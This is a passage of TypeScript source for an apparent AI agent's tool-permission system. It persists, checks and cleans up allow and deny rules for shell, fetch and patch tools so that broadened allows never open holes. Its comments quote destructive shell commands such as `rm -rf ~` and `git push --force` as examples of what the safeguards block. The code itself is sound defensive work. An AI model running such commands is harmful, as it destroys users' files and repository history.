 * (`git status` also covers `git status -s`).
 */
function shellAllowRule(match: string): PermissionRule {
  return holdsShellStar(match) || isCwdOnly(match)
    ? { action: 'allow', tool: 'run_shell', match, exact: true }
    : { action: 'allow', tool: 'run_shell', match }
}

/** The argument(s) {@link permissionSubject} reads a tool's subject from. */
function subjectArgKeys(toolName: string): string[] {
  if (toolName === 'run_shell') return ['command']
  if (toolName === 'web_fetch') return ['url']
  if (toolName === 'web_search') return ['query']
  if (toolName.startsWith('mcp__')) return []
  return ['path', 'pattern']
}

/**
 * The rule(s) an "Always allow" / "Always deny" on a call persists, each for the
 * call's own tool.
 *
 * - An ALLOW on `run_shell` stores generalized per-sub-command prefixes (see
 *   {@link shellRulePatterns}, given the run's `roots` so a `cd` out of them is kept),
 *   except that a sub-command kept verbatim and holding `*`, or changing directory, is
 *   exact (see {@link shellAllowRule}); a shell deny stays as typed (a broadened deny
 *   is risky).
 * - Any other ALLOW is `exact` (see {@link PermissionRule.exact}): it covers the one
 *   path, URL, or query the user approved. Saved as a glob instead, a model-chosen
 *   path would widen it: a file named `*` would allow every write, and a directory
 *   path would allow everything inside it.
 * - `apply_patch` stores one rule per file the patch touches, so a later patch is
 *   auto-approved only when every file it touches is covered (see {@link matchRule}).
 *   A patch that names no file stores nothing: the only pattern left would be `*`,
 *   which would allow (or deny) every patch to every file.
 * - An allow on a call that passes its subject argument blank (`path: ''`) stores
 *   nothing, for the same reason.
 * - A DENY stores the subject as a glob, so it can only be broader than the call
 *   (tightening). A tool whose calls carry no subject argument at all stores `*` (the
 *   rule then names the tool itself).
 */
export function persistedRules(
  action: 'allow' | 'deny',
  toolName: string,
  args: Record<string, unknown>,
  roots?: string[]
): PermissionRule[] {
  const exact = action === 'allow' && toolName !== 'run_shell'
  const rule = (match: string): PermissionRule =>
    exact ? { action, tool: toolName, match, exact: true } : { action, tool: toolName, match }
  if (toolName === 'apply_patch') return patchSubjectPaths(permissionSubject(toolName, args)).map(rule)
  const subject = permissionSubject(toolName, args)
  if (subject.trim()) {
    if (action === 'allow' && toolName === 'run_shell') return shellRulePatterns(subject, roots).map(shellAllowRule)
    return [rule(subject)]
  }
  if (action === 'allow' && subjectArgKeys(toolName).some((k) => typeof args[k] === 'string')) return []
  return [{ action, tool: toolName, match: subject || '*' }]
}

/**
 * Whether the current `rules` already resolve `sample` (a command, path, URL, or query
 * that a new rule would target) to ALLOW. Used to skip persisting a rule an existing,
 * broader rule already covers, so "Always allow" never piles up redundant entries.
 * Pass the run's `roots`, the same ones the gate matches with, so a relative path
 * resolves to the file the gate would check (without them it anchors at the cwd).
 */
export function alreadyAllowedAsRule(
  rules: PermissionRule[],
  toolName: string,
  sample: string,
  roots: string[] = []
): boolean {
  if (toolName === 'run_shell') return matchOneShell(rules, sample) === 'allow'
  return matchOne(rules, toolName, sample, roots) === 'allow'
}

/** Shell allow patterns that can never match a real command (see cleanupPermissionRules). */
const DEAD_SHELL_FRAGMENT = /^\d+$|[<>]$/

/**
 * A dead fragment, pure scaffolding (`done`, `fi`, `for f`) that the splitter now
 * strips before matching, or a pattern ending in a lone backslash (which an allow never
 * matches, see {@link shellAllowMatches}), so the rule can no longer match anything.
 */
function isDeadShellPattern(match: string): boolean {
  const m = match.trim()
  return DEAD_SHELL_FRAGMENT.test(m) || (m !== '' && stripShellScaffolding(m) === '') || endsInLoneBackslash(match)
}

/**
 * Rewrite a permission-rule list into an equivalent-but-tidier one, backing the
 * Settings panel's "Clean up rules" action. It:
 *
 * - Re-runs each `run_shell` ALLOW rule through {@link shellRulePatterns}, collapsing a
 *   pile of exact, `cd`-prefixed commands onto a handful of generalized prefixes —
 *   EXCEPT a rule is left exactly as-is when any generalization of it would newly cover
 *   an existing deny rule, so a narrower deny is never silently shadowed.
 * - Drops any allow rule already covered by an earlier kept allow rule, and any exact
 *   duplicate — preserving order, so first-match-wins semantics are unchanged.
 * - Drops a `run_shell` allow covered by a LATER, broader allow (`ls -la "dir"` before
 *   `ls -la`) when no deny/ask rule overlaps it, since nothing between the two can then
 *   change its verdict.
 * - Drops dead `run_shell` fragments an older splitter minted by cutting `2>&1` at the
 *   `&`: a pattern ending in a dangling redirect (`… 2>`, which no real command matches)
 *   and a bare fd number (`1`, not a command). Also drops rules that are pure shell
 *   scaffolding (`done`, `fi`, `for f`), and re-generalizes keyword-prefixed ones
 *   (`do wc` becomes `wc`), since segments are matched with that scaffolding stripped.
 * - Keeps every `exact` rule exact (it is never re-generalized), and never treats one
 *   as covering a broader rule: an exact `src` allows only `src`, so a later glob or
 *   prefix `src` allow is not redundant after it.
 * - Saves a sub-command it pulls out of a `run_shell` allow exact when it holds `*`,
 *   as "Always allow" does (see {@link shellAllowRule}): `cd /r && rm *` becomes an
 *   exact `rm *`, not a glob that allows `rm -rf ~`. A rule that is already its own
 *   pattern (`rm *`, `git *`) is left as it is: nothing records whether "Always allow"
 *   saved it or the user typed it as a glob on purpose, and the two read the same.
 *
 * Every drop removes an allow, so the result is never looser than the input. Deny/ask
 * rules and non-shell rules are preserved verbatim (only exact dedupe applies). Pure
 * and order-stable, so the caller can diff old vs new before saving.
 */
export function cleanupPermissionRules(rules: PermissionRule[]): PermissionRule[] {
  const overlapsAny = (gates: PermissionRule[], pattern: string): boolean =>
    gates.some((d) => {
      if (d.tool && d.tool !== '*' && d.tool !== 'run_shell') return false
      const deny = (d.match ?? '').trim()
      if (!deny) return false
      // A generalized allow covers `pattern` AND `pattern <args…>`. Keep the rule exact
      // if a deny's command-set overlaps EITHER, so broadening an allow can never open a
      // hole a narrower deny was guarding. A one-directional literal test (does the
      // allow-prefix match the deny's text) misses wildcard denies like `* --force*`,
      // which overlap the prefix `git push` only on the extended `git push --force …`.
      return globsIntersect(deny, pattern) || globsIntersect(deny, `${pattern} *`)
    })
  const denies = rules.filter((r) => r.action === 'deny')
  const gates = rules.filter((r) => r.action !== 'allow')
  const wouldShadowDeny = (pattern: string): boolean => overlapsAny(denies, pattern)
  const isShellAllow = (r: PermissionRule): boolean => r.action === 'allow' && r.tool === 'run_shell'
  const out: PermissionRule[] = []
  const seen = new Set<string>()
  // NUL separates the fields because it cannot appear in any of them. Write it as an
  // escape, never as a raw byte: a literal NUL makes grep and ripgrep treat the whole
  // file as binary and skip it.
  const key = (r: PermissionRule): string =>
    `${r.action}\u0000${r.tool}\u0000${r.match}\u0000${r.exact ? 'exact' : ''}`
  for (const r of rules) {
    if (isShellAllow(r) && isDeadShellPattern(r.match ?? '')) continue
    let expanded: PermissionRule[] = [r]
    if (isShellAllow(r) && !r.exact) {
      const pats = shellRulePatterns(r.match ?? '')
      const own = shellRuleText(r.match ?? '')
      // Keep the rule as it is if generalizing it could shadow a narrower deny.
      expanded = pats.some(wouldShadowDeny)
        ? [r]
        : pats.map((match) => (match === own ? { ...r, match } : { ...r, ...shellAllowRule(match) }))
    }
    for (const e of expanded) {
      if (seen.has(key(e))) continue
      // The coverage test matches e's pattern as one subject, which only proves an
      // exact rule redundant: a broader e also covers what lies past that subject.
      const priorAllows = out.filter((x) => x.action === 'allow' && (e.exact || !x.exact))
      if (e.action === 'allow' && alreadyAllowedAsRule(priorAllows, e.tool, e.match ?? '')) continue
      seen.add(key(e))
      out.push(e)
    }
  }
  // The pass above only sees EARLIER rules, so `ls -la "dir"` saved before `ls -la`
  // survives it. Drop such a rule when a remaining allow covers both the pattern and its
  // extensions (it was a prefix rule) and no deny/ask overlaps it. Globs are left alone:
  // two probe strings can't prove one glob covers another.
  const kept = [...out]
  for (const r of out) {
    if (!isShellAllow(r)) continue
    const m = trimShellBlanks(r.match ?? '')
    if (!m || /[*?[]/.test(m) || overlapsAny(gates, m)) continue
    const covered = kept.some(
      (o) =>
        o !== r &&
        isShellAllow(o) &&
        alreadyAllowedAsRule([o], 'run_shell', m) &&
        alreadyAllowedAsRule([o], 'run_shell', `${m} x`)
    )
    if (covered) kept.splice(kept.indexOf(r), 1)
  }
  return kept
}
